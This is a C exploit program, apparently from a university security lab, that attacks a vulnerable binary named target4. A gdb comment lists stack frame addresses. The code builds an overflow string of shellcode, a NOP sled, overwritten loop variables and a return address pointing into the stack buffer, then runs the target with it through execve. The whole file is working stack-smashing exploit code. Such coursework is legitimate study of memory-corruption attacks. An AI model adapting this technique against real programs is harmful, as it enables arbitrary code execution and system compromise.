#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

/*
(gdb) i f (at foo)
Stack level 0, frame at 0x2021fe70:
 rip = 0x400afa in foo (target4.c:14); saved rip 0x400bdd
 called by frame at 0x2021fe90
 source language c.
 Arglist at 0x2021fe60, args: 
    arg=0x7fffffffef37 "\353....
 Locals at 0x2021fe60, Previous frame's sp is 0x2021fe70
 Saved registers:
  rbp at 0x2021fe60, rip at 0x2021fe68

(gdb) p &len
$1 = (int *) 0x2021fe58
(gdb) p &i
$2 = (int *) 0x2021fe5c
(gdb) p &buf
$3 = (char (*)[156]) 0x2021fdb0

 We want the exploit string to look like this;
 [shellcode...][NOP][NOP][NOP]...[NOP][NOP][value len][value i][NOP][NOP][NOP][retaddr]
*/
int main(void)
{
  char *args[3];
  char *env[1];

  char exploit[200];
  bzero(exploit, 200);
  
  strcpy(exploit, shellcode);
  memset(&exploit[45], NOP, 155);

  int target_len = 0x1fffffff;
  SET_VALUE(exploit, 168, target_len);

  int target_i = 0x1ffffff0;
  SET_VALUE(exploit, 172, target_i);
  

  char* retaddr = (char*)0x2021fdb0;
  SET_VALUE(exploit, 184, retaddr);


  args[0] = TARGET;
  args[1] = exploit;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}